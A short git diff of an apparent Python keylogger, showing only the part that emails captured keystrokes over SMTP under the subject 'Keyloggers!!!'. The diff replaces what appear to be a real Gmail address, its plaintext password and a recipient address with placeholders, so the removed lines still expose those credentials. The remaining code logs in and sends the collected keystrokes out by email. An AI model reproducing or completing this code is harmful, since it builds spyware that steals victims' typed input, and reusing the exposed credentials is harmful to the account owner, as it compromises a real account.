@@ -34,9 +34,9 @@ with Listener(on_press=on_press, on_release=on_release) as listener:
 
 
 
-email_user = 'jalaja272003@gmail.com'
-email_password = 'Jalaja@2003'
-email_send = 'jalajam2003@gmail.com'
+email_user = 'username'
+email_password = 'password'
+email_send = 'email_id'
 
 subject = 'Keyloggers!!!'
 
@@ -65,3 +65,4 @@ server.login(email_user,email_password)
 
 server.sendmail(email_user,email_send,text)
 server.quit()
+
